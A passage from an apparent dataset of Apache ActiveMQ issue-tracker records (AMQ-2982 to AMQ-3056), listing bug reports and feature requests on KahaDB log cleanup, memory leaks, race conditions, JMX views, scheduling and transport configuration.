maxReconnectAttempts=30, useExponentialBackOff=false} at org.apache.activemq.transport.TransportFactory.doCompositeConnect(TransportFactory.java:159) at org.apache.activemq.transport.TransportFactory.compositeConnect(TransportFactory.java:93) at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:844) at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:135) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:619)4. downgrading to amq 5.3.2 solves the problemNOTE: a new functionality has been added to 5.4.0 ref : http://activemq.apache.org/discovery-transport-reference.htmlApplying parameters to discovered transportsFrom 5.4, transport parameters in the URI will also be applied to discovered transports. Therefore, transport parameters may also include parameters for the discovered transport. For example, adding the connectionTimeout parameter to the URI will apply the parameter to every discovered TCP transport, even though this parameter is not a Discovery transport option.I think the above change has caused the problem
issueID:AMQ-2982
type:Bug
changed files:
texts:Sticky KahaDB log files due to local transaction rollback
On a rollback of a local transaction the transaction won"t be removed from the inflight transaction list of the KahaDB MessageDatabase. This leads to KahaDB log files which won"t be deleted even if there are no messages which are referred by the log file.
issueID:AMQ-2983
type:Bug
changed files:
texts:Sticky KahaDB log files due to concurrent consumer with local transaction
Concurrent consumer with local transactional session and session.receive() leads to KahaDB log files which won"t be deleted even if there are no messages which are referred by the log file.Please, see the attached test case. If only one consumer is configured it seems to work, but with more than one concurrent consumer the test fails.
issueID:AMQ-2985
type:Bug
changed files:
texts:Missing messages in durable subscription with selector and KahaDB
With a selector and reconnecting durable sub, some messages appear missing as if they were acked in error.
issueID:AMQ-2986
type:Bug
changed files:StoreUsage.java
texts:StorePercentUsage is not refreshed when retrieved over JMX
Even if the usage is calculated appropriately, the value displayed in JConsole is cached and not calculated on every call, so you can get impression that it"s not updated.
issueID:AMQ-2988
type:Improvement
changed files:
texts:Allow to retrieve the JMSProperties when using JMS Stream (ActiveMQInputStream)
When using JMS Streams (aka ActiveMQInputStream and ActiveMQOutputStream) its impossible to retrieve the used JMS Properties which where used while writing the OutputStream.  The only method which allows this is the ActiveMQInputStream.receive() method. But this will corrupt the InputStream because it will remove the Message from it.So I think it makes sense to add a method for retrieving the Properties. I also think the receive() method should be private or protected to guard against wrong usage ( I used it before to retrieve the properties and wondered why it corrupted the stream).
issueID:AMQ-2989
type:Improvement
changed files:
texts:Upgrade xmlpull with xpp3
None
issueID:AMQ-2990
type:Improvement
changed files:ActiveMQOutputStream.java
texts:Allow to specify the chunk size when using JMS Stream (ActiveMQOutputStream)
When using JMS Stream the ActiveMQOutputStream splits the data in 64k chunks. This is a good default but sometimes it would be good to be able to use a other chunk size (depending on the need). So we should make this configurable via a JMS Property
issueID:AMQ-2993
type:Bug
changed files:
texts:Virtual topic interceptor process advisory messages
This can cause all sorts of trouble (including forwarding ConsumerInfo to the consumer) in networked environment.
issueID:AMQ-2997
type:Improvement
changed files:
texts:Default log4j.properties has Camel set at ERROR level. Please lower this to WARN or maybe even better at INFO
See the log4j.properties herehttps://svn.apache.org/repos/asf/activemq/trunk/assembly/src/release/conf/log4j.propertieslog4j.logger.org.apache.camel=ERRORThis logger should be changed to WARN or maybe even INFO, so folks can see Camel lifecycle in the logs when using Camel.
issueID:AMQ-2999
type:Bug
changed files:PeerTransportFactory.java
texts:peer transport factory mapping localhost incorrectly to loopback
Issue described in the first posting of that thread: http://activemq.2283324.n4.nabble.com/Problem-with-simple-peer-configuration-my-config-or-AMQ-issue-td3013268.html#a3013268Reply from Gary Tully explains the problem: "That looks like a bug in the peer transport factory. I uses localhost:0 as the tcp transport url, but localhost maps to the loopback address since 5.3&#91;1&#93; so the connection is refused. The peer transport factory should use the wildcard address, 0.0.0.0"
issueID:AMQ-3000
type:Bug
changed files:
texts:Multiple Cron Scheduled Messages don&#39;t fire every minute as configured
I ran into a scenario where I have multiple Scheduled Messages with a cron string set to fire every minute that are created at different times.  However, only one is firing every minute (cycles 0 to 9).  I will attach a test Case that could be incorporated into org.apache.activemq.broker.scheduler.JmsSchedulerTest
issueID:AMQ-3003
type:New Feature
changed files:
texts:Allow the option of a DLQ per durable subscription DeadLetterStrategy
From https://issues.apache.org/activemq/browse/AMQ-2584 - with durable subscriptions sharing the DLQ there will be duplicate sends to the dlq if more than one durable sub rejects the message. These durables are suppressed provided they are not already acked, in which case the duplicate can hang about. The audit=false option for the DLQ works around this, but it begs the question, can I know which durable subscription refused a message.To facilitate this, having a DLQ pre durable sub is a nice option. It can use the clientId and subscriberName as the postfix, so ACTIVEMQ_DLQ.ClientId-SubscriberName - If the subscriber changes subsequent messages can go do a different DLQ. These destinations would need to be manually deleted when no longer needed.This will require additional methods in org.apache.activemq.broker.region.policy.DeadLetterStrategy so will need to a version update.
issueID:AMQ-3004
type:Bug
changed files:
texts:Build-up of unwanted messages
One of our installations have several consumers. These consumers subscribe for messages from a queue linked to a virtual topic. All consumers supply a selector. Some consumers connect, process any persisted messages, then disconnect. These connect/disconnect cycles are repeated a few times a day.What we"ve seen is that messages build-up for consumers. These messages does not match the supplied selector. The side effect of this was that we ran into a situation whereby message "got stuck". Increasing the maxPageSize property helped. This is unfortunately a short term solution.A simple test was constructed whereby selectorAware was set to true:<virtualDestinations>  <virtualTopic name="VirtualTopic.>" prefix="Consumer.*." selectorAware="true"/></virtualDestinations>What we noticed is that: Messages are correctly received by a connected consumer A consumer that connects, disconnects and re-connects later will loose any messages that were send in the time period it was disconnected.This behaviour was unexpected. From the AMQ documention (http://activemq.apache.org/virtual-destinations.html):From version 5.4, dispatch from virtual topics to subscription queues can be selectorAware such that only messages that match one of the existing subscribers are actually dispatched. Using this option prevents the build up of unmatched messages when selectors are used by exclusive consumersNote: it does not state that the consumer needs to be connected for this feature to work.Given the test it looks like subscriptions itself are not persisted, thus the AMQ broker has no idea that it should enqueue a message for a particular subscription queue.Would it be possible to add either of: Persist subscription detail, specifically for the case where the subscription"s selector should be applied to the subscription queue Propagate selectors and the attached  subscription queue to the top-level virtual topic so that only interested messages can be delivered to the intended recipient?Anything else we can try, supply or help with?
issueID:AMQ-3005
type:Bug
changed files:
texts:The spring.schemas file contains an invalid mapping
The spring.schemas file, in META-INF, contains the following mappings:http://activemq.org/config/1.0=activemq.xsdhttp://activemq.org/config/1.0/1.0.xsd=activemq.xsdhttp://activemq.apache.org/schema/core=activemq.xsdhttp://activemq.apache.org/schema/core/activemq-core.xsd=activemq.xsdhttp://activemq.apache.org/schema/core/activemq-core-5.0.0.xsd=activemq.xsdhttp://activemq.apache.org/schema/core/activemq-core-5.1.0.xsd=activemq.xsdhttp://activemq.apache.org/schema/core/activemq-core-5.2.0.xsd=activemq.xsdhttp://activemq.apache.org/schema/core/activemq-core-5.3.0.xsd=activemq.xsdhttp://activemq.apache.org/schema/core/activemq-core-${pom.version}.xsd=activemq.xsdThe final mapping contains an unresolved placeholder, ${pom.version}.  XML files which use, for example http://activemq.apache.org/schema/core/activemq-core-5.4.1.xsd as a schemaLocation reference will fail to be mapped correctly with the spring.schemas mechanism.  This failure is silent on an internet-connected machine which is allowed to resolve the schemaLocation through the http:// url.  When the machine is not internet-connected, though, the failure rears its ugly head and smacks down hard on my webapp"s startup with a SAXParseException.
issueID:AMQ-3006
type:Bug
changed files:
texts:STOMP connector assigns wrong default priority to incoming messages
If a client sends a Stomp frame without a priority header, the broker does not set the message priority to the default value (4) which is specified in the JMS spec (see http://download.oracle.com/javaee/1.4/api/javax/jms/Message.html: DEFAULT_PRIORITY The message producer"s default priority is 4.) As effect, the message will have priority 0 (lowest).Adding a priority header for all messages by the Stomp client, even for default priority, would also cause larger messages to be sent over the wire.
issueID:AMQ-3007
type:Bug
changed files:LockFile.java
texts:Kahadb LockFile.lock() leaks file descriptors if tryLock() returns an IOException
The slave will output these messages:INFO | Database /mnt/activemqdata/lock is locked... waiting 10 seconds for the database to be unlocked ......After awhile, the messages change to:INFO | Database /mnt/activemqdata/lock is locked... waiting 10 seconds for the database to be unlocked. Reason: java.io.FileNotFoundException: /mnt/activemq/lock (Too many open files) ....Upon inspection of LockFile.lock(), OverlappingFileLockException is the only exception caught.  In the event tryLock() throws IOException, as it does inmy case, the readFile isn"t cleaned up and the caller (which catches IOExceptions), just iterates again.Since javadoc says FileChannel.tryLock() throws an IOException, and the caller in this case, and MessageDatabase expects to catch IOExceptions, itwould seem like adding this to the code in LockFile.lock() should fix this issue.catch (IOException e){    reason = e;}
issueID:AMQ-3010
type:New Feature
changed files:
texts:ActiveMQInputStream should allow to specify a timeout like MessageConsumer.receive() does
When using ActiveMQInputStream you are not able todo some kind of polling consuming. As soon as you call ActiveMQInputStream.read() it will block until it receive a message. So it could block forever. Sometime it would be usefull to allow some kind of polling even when using a stream.
issueID:AMQ-3012
type:Bug
changed files:HttpTunnelServlet.java
texts:HttpTunnelServlet incorrectly swallows exceptions during transport creation.
Symptom=======org.apache.activemq.transport.http.HttpTunnelServlet.java contains the following logic:    protected BlockingQueueTransport createTransportChannel(HttpServletRequest request, HttpServletResponse response) throws IOException {...            clients.put(clientID, answer);            Transport transport = answer;            try {                HashMap options = new HashMap(transportOptions);                transport = transportFactory.serverConfigure(answer, null, options);            } catch (Exception e) {               IOExceptionSupport.create(e);            }If the call to transportFactory.serverConfigure(...) throws an exception, IOExceptionSupport.create(e) is called, which wraps the exception in an IOException, but that IOException is never thrown.Solution=======See attached patch file.  Add a "throw" clause to propagate the IOException.
issueID:AMQ-3013
type:Bug
changed files:TopicRegion.java
texts:Problem with removing durable subscribers from the BrokerView
There"s a general problem with durable subscribers and respective mbeans. There are two methods on BrokerView: getDurableTopicSubscribers() - which should return only active subs getInactiveDurableTopicSubscribers() - which should return only inactive (offline) subsSo when we create durable topic subscriber it should be shown in active subs. When we close that session, it should go to the "inactive" list and finally when we unsubscribe, it should be completely removed.Also, the web console should be show both active and "offline" subs in separate lists.
issueID:AMQ-3014
type:Bug
changed files:
texts:DemandForwardingBridgeSupport can send BrokerInfo to remote transport before local broker ID is known.
Symptom========We have a production system that involves a set of Brokers connected in a demand-forwarding Network-of-Brokers using HTTP-based bridges.  Each Broker periodically scans its list of peer brokers by iterating over RegionBroker.getPeerBrokerInfos:    public synchronized BrokerInfo[] getPeerBrokerInfos() {        BrokerInfo[] result = new BrokerInfo[brokerInfos.size()];        result = brokerInfos.toArray(result);        return result;    }This scanning code assumes that BrokerInfo.getBrokerId() is always non-null (since every broker should have an ID).  However, we periodically noticed that BrokerInfo.getBrokerId() returned a NULL value, which was very unexpected.Cause======We analyzed the DemandForwardingBridgeSupport and noticed that when the remote bridge/transport is started, it sends the local Broker"s ID:    protected void startRemoteBridge() throws Exception {...                    brokerInfo.setBrokerId(this.localBrokerId);                    remoteBroker.oneway(brokerInfo);                }The local Broker"s ID is not initially known until it is received from the local transport and processed by DemandForwardingBridge.serviceLocalBrokerInfo(...):    protected void serviceLocalBrokerInfo(Command command) throws InterruptedException {        synchronized (brokerInfoMutex) {            localBrokerId = ((BrokerInfo)command).getBrokerId();            localBrokerPath&#91;0&#93; = localBrokerId;            localBrokerIdKnownLatch.countDown();The local Broker"s ID is dispatched asynchronously when the local transport is started, as seen in TransportConnection.start():    public void start() throws Exception {        starting = true;        try {            synchronized (this) {                if (taskRunnerFactory != null) {                    taskRunner = taskRunnerFactory.createTaskRunner(this, "ActiveMQ Connection Dispatcher: "                            + getRemoteAddress());                } else {                    taskRunner = null;                }                transport.start();                active = true;                dispatchAsync(connector.getBrokerInfo());Because of the asynchronous dispatch, the remote bridge may be started before the local Broker"s ID is known.  This would be particularly evident when the local broker is under load processing a lot of tasks.We"ve attached a unit test that demonstrates how a slow asynchronous dispatch on the local transport can cause the remote transport to transmit a null BrokerId.Solution======DemandForwardingBridgeSupport already contains a  localBrokerIdKnownLatch, so starting the remote transport should wait for this latch before accessing the local Broker"s ID (see patch).
issueID:AMQ-3015
type:Bug
changed files:
texts:Javascript client does not establish session properly.
In some configurations, the javascript client (amq.js) is not loaded from the same container that hosts the activemq broker.  For example, we have a Rails app and ActiveMQ both sitting behind apache, and the amq.js file is served directly by apache.In these kinds of configurations, when the javascript client first calls amq.init(), there is no JSESSIONID.  Both the POST to establish the subscription and the GET to start polling are delivered asynchronously, both without a JSESSIONID, and thus they each end up with different JSESSIONIDS, and the poll never returns any messages (as that session has no subscription).This small patch adds support for a callback mechanism that will allow clients to sign up using a callback mechanism that ensures that the JESSIONID is established properly before attempting to make a subscription, like this:amq.init({     uri: "/amq",    sessionInitializedCallback: function() {         amq.addListener("display", "topic://sensors", onMessage);           } });The patch is also backwards compatible, so existing code should still work (albeit with the same existing problem).
issueID:AMQ-3016
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Race condition in DemandForwardingBridgeSupport can cause remote connection to be leaked.
Symptom========I set up two Brokers and a network bridge from Broker A to Broker B over HTTP.  When the bridge is established, each Broker has a single transport connection (VM on broker A and HTTP on broker B) as recorded in RegionBroker.connectionsI noticed that when Broker A was stopped (normally), periodically the HTTP connection would remain in Broker B"s RegionBroker.connections until the InactivityMonitor on the connection timed out.  If the InactivityMonitor was disbled, then the connection would remain indefinitely.  If Broker A was restarted, the bridge would be restarted and a second connection would be recorded in Broker B"s RegionBroker.connections.  Repeating restarts of Broker A would cause an accumulation of "dead" connections, which would eventually lead to an OOM.Cause=====When Broker A is stopped, DemandForwardingBridgeSupport.stop() is called and sends a ShutdownInfo command to the local and remote transports.  When the transports receive the ShutdownInfo, they remove the connection from their associated RegionBroker.connections as part of  TransportConnection.processRemoveConnection(ConnectionId, long):    public synchronized Response processRemoveConnection(ConnectionId id, long lastDeliveredSequenceId)            throws InterruptedException {...            try {                broker.removeConnection(cs.getContext(), cs.getInfo(), null);            } catch (Throwable e) {                SERVICELOG.warn("Failed to remove connection " + cs.getInfo(), e);            }In the cases were Broker B would not clean up its connection, I traced the code and discovered that the ShutdownInfo message was not being sent because the remote transport (HttpClientTransport) had already had its "stopped" flag set to true as part of HttpClientTransport.oneway(Object command):    public void oneway(Object command) throws IOException {        if (isStopped()) {            throw new IOException("stopped.");        }...DemandForwardingBridgeSupport"s stop() method has the following code:    public void stop() throws Exception {...                    ASYNC_TASKS.execute(new Runnable() {                        public void run() {                            try {                                localBroker.oneway(new ShutdownInfo());                                sendShutdown.countDown();                                remoteBroker.oneway(new ShutdownInfo());                            } catch (Throwable e) {                                LOG.debug("Caught exception sending shutdown", e);                            } finally {                                sendShutdown.countDown();                            }                        }                    });                    if (!sendShutdown.await(10, TimeUnit.SECONDS)) {                        LOG.info("Network Could not shutdown in a timely manner");                    }                } finally {                    ServiceStopper ss = new ServiceStopper();                    ss.stop(remoteBroker);                    ss.stop(localBroker);                    // Release the started Latch since another thread could be                    // stuck waiting for it to start up.                    startedLatch.countDown();                    startedLatch.countDown();                    localStartedLatch.countDown();                    ss.throwFirstException();                }            }ShutdownInfo is sent asynchronously to the local and remote transports by a slave thread:                                localBroker.oneway(new ShutdownInfo());                                sendShutdown.countDown();                                remoteBroker.oneway(new ShutdownInfo());The sendShutdown  latch is used by the master thread to prevent running the finally clause until the ShutdownInfo has been sent:                    if (!sendShutdown.await(10, TimeUnit.SECONDS)) {                        LOG.info("Network Could not shutdown in a timely manner");                    }                } finally {                    ServiceStopper ss = new ServiceStopper();                    ss.stop(remoteBroker);                    ss.stop(localBroker);...                }            }However, because the latch is countdown before remoteTransport.oneway(new ShutdownInfo()) there is a race condition and in most cases the main thread calls ss.stop(remoteBroker) before the slave thread has completed its call to remoteTransport.oneway(new ShutdownInfo()).  As a result, the remoteTransport appears already stopped and the ShutdownInfo is discarded.  This leaves the connection dangling on the remote broker until the InactivityMonitor closes it.Solution======The sendShutdown latch should be countdown after remoteTransport.oneway(new ShutdownInfo()).
issueID:AMQ-3017
type:New Feature
changed files:
texts:Add support for stream data to filesystem when using BlobMessages
Using BlobMessages can help to reduce the memory usage very much when you have the need to transfer many big messages via activemq. However for this you need some kind of storage which can be used to transfer the payload to. ActiveMQ can handle the transfer with FTP and HTTP at the moment. However if you only run an embed ActiveMQ broker this is often overkill and just plain slow. Here it would be cool to just stream the payload from and to the filesystem, to get the memory improvement when using BlobMessages but keep the complex level low + have high speed.
issueID:AMQ-3020
type:Bug
changed files:
texts:Message is lost while browsing composite queues over the network
None
issueID:AMQ-3021
type:Bug
changed files:
texts:HttpTunnelServlet leaks BlockingQueueTransport objects, causing eventual OOM on heap space
Symptom========We have a production system involving a network of 8 Brokers connected over HTTP.  The Brokers discover each other using SimpleDiscoveryAgent.  Our network experienced a period of instability during which time numerous Broker-to-Broker bridges were created and failed repeatedly.  Over the course of about 7 hours, two of the Brokers crashed with OOM heap space errors.We analyzed the heap dump and discovered several thousand instances of org.apache.activemq.transport.http.BlockingQueueTransport.  These transports were associated with bridges that had failed, however, they were not being garbage collected because HttpTunnelServlet was maintaining references to them.This issue was easily replicated in a test environment were we repeatedly broke the connection between a pair of Brokers connected over HTTP.  In each case, both Brokers maintained indefinitely a number of instances of BlockingQueueTransport equal to the number of times the network was interrupted.Cause=====When a bridge is first created over HTTP, the client broker"s HttpClientTransport sends a HEAD command to the server broker, which is processed by an instance of HttpTunnelServlet.  In response,e HttpTunnelServlet creates an instance of BlockingQueueTransport to represent the connection to the client broker.  This instance of BlockingQueueTransport is stored in a private hash map managed by HttpTunnelServlet and indexed by the client"s unique ID:public class HttpTunnelServlet extends HttpServlet {...    private final Map<String, BlockingQueueTransport> clients = new HashMap<String, BlockingQueueTransport>();...    protected BlockingQueueTransport createTransportChannel(HttpServletRequest request, HttpServletResponse response) throws IOException {        String clientID = request.getHeader("clientID");...            answer = createTransportChannel();            clients.put(clientID, answer);...Every time a client broker reestablishes a bridge, it generates a new clientID.  As a result, the clients hash map accumulates instances of BlockingQueueTransport, one for each bridge created.  Nowhere in the implementation of HttpTunnelServlet is there any code that removes the instance when a client broker is no longer connected.  In an environment with multiple brokers and an unreliable network, the client hash  map can accumulate thousands of instances of BlockingQueueTransport.Solution=======HttpTunnelServlet needs to remove an instance of BlockingQueueTransport from the clients hash map whenever that instance is no longer being used.  The addition of InactivityMonitor as a default interceptor for the BlockingQueueTransport (see AMQ-2764) is a partial solution in that it triggers the closure of unused BlockingQueueTransport instances; however, HttpTunnelServlet does not detect these closures.The solution is included a patch and involves the following changes to HttpTunnelServlet (not all changes are directly related to the OOM):1) The addition of a ServiceListener to the BlockingQueueTransport, which is triggered when the transport is closed and causes the removal of the transport from the clients hash map2) Refactoring of the access to the clients hash map to simplify thread safety (in particularly, removal of explicit synchronization in lieue of ConcurrentHashMap)3) An additional check on the BlockingQueueTransport to ensure that it was not prematurely closed (the previous code ignored this possibility)
issueID:AMQ-3022
type:Bug
changed files:TransactionContext.java
texts:ActiveMQ does not support suspend/resume of transactions
A user of the Bitronix transaction manager had trouble with ActiveMQ and its ability to suspend/resume transactions. See the Bitronix issue for more information.
issueID:AMQ-3023
type:Bug
changed files:DestinationView.java
texts:DestinationView.browseMessages(String) must not call OpenTypeSupport.convert()
Method DestinationView.browseMessages(String) should return a homogeneous List of Message(s). Therefore, line 196 of DestinationView.java must not call OpenTypeSupport.convert(), and should be changed:From:    answer.add(OpenTypeSupport.convert(message));To:    answer.add(message);Just like line 200 that follows.
issueID:AMQ-3024
type:New Feature
changed files:SchedulerBroker.java
texts:Scheduler should support non-Kaha persistence
Currently, the persistence adapter attached to the broker service is simply ignored by the scheduler. The scheduler always uses KahaDB, instead.I see two ways to go about this: Creating a SchedulerPersistenceAdapter akin to (and possibly extending from) PersistenceAdapter, as well as a corresponding factory class and BrokerService property. This seems clumsy, but is in line with the approach currently taken, separating scheduler-related data from non-scheduler-related data - see  BrokerService.setDataDirectoryFile() vs. BrokerService.setSchedulerDirectoryFile(). This approach is probably unnecessary, since the scheduler can clearly use existing PersistenceAdapters (or at least the KahaDB adapeter). Depracating or removing the BrokerService.schedulerDirectoryFile property and having the scheduler use the one and only persistence adapter attached to the BrokerService (if it"s a journaling adapter - BrokerService.dataDirectoryFile will be used, rather than BrokerService.schedulerDirectoryFile). This seems like the reasonable approach.
issueID:AMQ-3028
type:Bug
changed files:PageFile.java
texts:ActiveMQ broker processing slows with consumption from large store
In scalability tests, this problem occured.  I have tested a workaround that appears to function.  A fix will gladly be submitted - would like some guidance, though, on the most appropriate solution.Here"s the summary.  Many more details are available upon request.Root cause: Believed to be simultaneous access to LRUCache objects which are not thread-safe (PageFile"s pageCache)Workaround: Synchronize the LRUCache on all access methods (get, put, remove)The symptoms are as follows:  1. Message rates run fairly-constant until a point in time when they degrade rather quickly  2. After a while (about 15 minutes), the message rates drop to the floor - with large numbers of seconds with 0 records passing  3. Using VisualVM or JConsole, note that memory use grows continuosuly  4. When message rates drop to the floor, the VM is spending the vast majority of its time performing garbage collection  5. Heap dumps show that LRUCache objects (the pageCache members of PageFile"s) are far exceeding their configured limits.      The default limit was used, 10000.  A size of over 170,000 entries was reached.  6. No producer flow control occurred (did not see the flow control log message)Test scenario used to reproduce: Fast producers (limited to <= 1000 msgs/sec)   using transactions  10 msg per transaction  message content size 177 bytes   Slow consumers (limited to <= 10 msg/sec)   auto-acknowledge mode; not transacted   10 Queues   1 producer per queue  1 consumer per queue   Producers, Consumers, and Broker all running on different systems, and on the same system (different test runs).Note that disk space was not an issue - there was always plenty of disk space available.One other interesting note - once a large database of records was stored in KahaDB, only running consumers, this problem still occurred.This issue sounds like it may be related to 1764, and 2721.  The root cause sounds the same as 2290 - unsynchronized access to LRUCache.The most straight-forward solution is to modify all LRUCache objects (org.apache.kahadb.util.LRUCache, org.apache.activemq.util.LRUCache, ...) to be concurrent.  Another is to create concurrent versions (perhaps ConcurrentLRUCache) and make use of those at least in PageFile.pageCache.
issueID:AMQ-3029
type:Bug
changed files:
texts:Exception when try to browse ActiveMQBlobMessage via JMX
Unable to browse ActiveMQBlobMessages via JMXWARN  09:39:13,383 | org.apache.activemq.broker.jmx.DestinationViewMBean | exception browsing destinationjavax.management.openmbean.OpenDataException: Cannot create a CompositeData fortype: org.apache.activemq.command.ActiveMQBlobMessage        at org.apache.activemq.broker.jmx.OpenTypeSupport.convert(OpenTypeSupport.java:481)        at org.apache.activemq.broker.jmx.DestinationView.browse(DestinationView.java:157)        at org.apache.activemq.broker.jmx.DestinationView.browse(DestinationView.java:138)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:93)        at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:27)        at com.sun.jmx.mbeanserver.MBeanIntrospector.invokeM(MBeanIntrospector.java:208)        at com.sun.jmx.mbeanserver.PerInterface.invoke(PerInterface.java:120)        at com.sun.jmx.mbeanserver.MBeanSupport.invoke(MBeanSupport.java:262)        at javax.management.StandardMBean.invoke(StandardMBean.java:391)        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:836)        at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:761)        at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnectionImpl.java:1426)        at javax.management.remote.rmi.RMIConnectionImpl.access$200(RMIConnectionImpl.java:72)        at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run(RMIConnectionImpl.java:1264)        at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(RMIConnectionImpl.java:1359)        at javax.management.remote.rmi.RMIConnectionImpl.invoke(RMIConnectionImpl.java:788)        at sun.reflect.GeneratedMethodAccessor60.invoke(Unknown Source)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:305)        at sun.rmi.transport.Transport$1.run(Transport.java:159)        at java.security.AccessController.doPrivileged(Native Method)        at sun.rmi.transport.Transport.serviceCall(Transport.java:155)        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)        at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-3031
type:Bug
changed files:Scheduler.java
texts:Time Synchronization Solution
We had a Problem if we synchronize the time of 1.1.2000 to the actual date. The cpu load increase to 170% over a long time period. We analyse the problem and find out that is a java timer problem. We pass the classes Scheduler.java in following packages:1. kahadbsrcmainjavaorgapachekahadbutil2. activemq-coresrcmainjavaorgapacheactivemq	hreadWe change the TimerTask by ScheduledThreadPoolExecutor. That was the solution. I want to discuss if that is the right solution or not. Can you analyze the classes and say if that is the right way or not? If not can you propose a solution. If yes can you release that with the next version.
issueID:AMQ-3033
type:Bug
changed files:
texts:BrokerService leaks threads when scheduler or jmx are enabled
If I launch the broker with the below, without the first two lines, and call brokerService.stop(), I have 13 more threads after than I had when I started. This in spite of the code I see in the BrokerService class that claims to shut down the scheduler (and the scheduler is one of the threads).            brokerService.setSchedulerSupport(false);            brokerService.setUseJmx(false);            brokerService.setPersistenceAdapter(new MemoryPersistenceAdapter());            brokerService.setPersistent(false);            brokerService.setUseShutdownHook(true);            brokerService.setUseLoggingForShutdownErrors(false);            brokerService.setSchedulerSupport(false);            bindAddress = "tcp://localhost:" + getBrokerPort();            tcpTransport = brokerService.addConnector(bindAddress);            brokerService.setDataDirectory(dataDirectory.getAbsolutePath());            brokerService.start();
issueID:AMQ-3035
type:Bug
changed files:
texts:activemq script ignores ACTIVEMQ_SSL_OPTS from environment
We should re-enable setting ssl properties using SSL_OPTS environment variable
issueID:AMQ-3036
type:Bug
changed files:
texts:Scheduled message CRON strings not parsed correctly
I am trying to send a scheduled message using a AMQ_SCHEDULED_CRON string but it  is being scheduled for really bizarre times!This is caused by errors in the org.apache.activemq.broker.scheduler.CronParser.getNextScheduledTime(..) - patch attached including junits.
issueID:AMQ-3038
type:Bug
changed files:ActiveMQTempDestination.java
texts:Possible Memory-Leak as ActiveMQTempDestinations don&#39;t get deleted when ActiveMQConnection.close() is called
As TemporaryQueue and TemporaryTopic is bound to the scope of a Connection both should be deleted when the Connection is closed. If that"s not done its possible to see a Memory-Leak on heavy usage really soon
issueID:AMQ-3040
type:Bug
changed files:ConnectionState.java
ConnectionStateTracker.java
TransportConnection.java
texts:ConnectionState.getTempDesinations() should be renamed to ConnectionState.getTempDestinations()
There is a type in the method name of ConnectionState.getTempDesinations(). This should be ConnectionState.getTempDestinations()
issueID:AMQ-3041
type:Bug
changed files:
texts:TemporyQueue will never get unregisterd from JMX which leads to a memory leak
When you use Session.createTemporaryQueue(...) you will see that the TemporaryQueue will get added to JMX. Now when you call TemporaryQueue.delete() it will not get delete from JMX. So when you make heavy use of TemporaryQueues you will see that the entries in JMX will get bigger and bigger as they will never get removed on delete. This can lead to an OOM very frequently.
issueID:AMQ-3044
type:New Feature
changed files:
texts:Enable securing created JMX connector
When creating JMX connector (instead using platform one), we should be able to secure the access with username and password like:    <managementContext>      <managementContext createConnector="true" connectorPort="2011" jmxDomainName="test.domain">          <property xmlns="http://www.springframework.org/schema/beans" name="environment">              <map xmlns="http://www.springframework.org/schema/beans">    <entry xmlns="http://www.springframework.org/schema/beans" key="jmx.remote.x.password.file" value="src/test/resources/jmx.password"/>    <entry xmlns="http://www.springframework.org/schema/beans" key="jmx.remote.x.access.file" value="src/test/resources/jmx.access"/>              </map>          </property>      </managementContext>    </managementContext>
issueID:AMQ-3045
type:Improvement
changed files:
texts:Add property maximumRedeliveryDelay in org.apache.activemq.RedeliveryPolicy
When useExponentialBackOff was set to true (and with backOffMultiplier default value 5), the delay period each time increases very fast. So we should have a property maximumRedeliveryDelay to make sense.Camel has a similar feature .
issueID:AMQ-3049
type:Bug
changed files:FailoverTransport.java
texts:initialReconnectDelay on failover transport is not being honored
It"s honored only when useExponentialBackOff is set to false, so the url likefailover:(tcp://localhost:61616,tcp://localhost:61618)?initialReconnectDelay=10000&randomize=false&updateURIsSupported=falsewill ignore it
issueID:AMQ-3050
type:Bug
changed files:
texts:ActiveMQ standalone script doesn&#39;t return with 0 when stop is called.
I was testing to see if the ./bin/activemq script was LSB compatible (I want to integrate activemq into a pacemaker setup).When calling ./bin/activemq stop, the script should return 0 on success.The problem is in the invokeJar function.  In the "stop" case , the value of RET is set in the context of a forked process.The proposed fix, is identical to how RET is handled in the other 2 cases.
issueID:AMQ-3052
type:Bug
changed files:SimpleAuthenticationBroker.java
texts:Memory leak in SimpleAuthenticationBroker
When the addConnection() fails after the successful auth check, we need to remove security context.
issueID:AMQ-3054
type:Bug
changed files:
texts:add property placeholder bean to activemq-jdbc.xml
None
issueID:AMQ-3056
type:Bug
changed files:
texts:Exception when Redelivery ack is processed by topic subscription
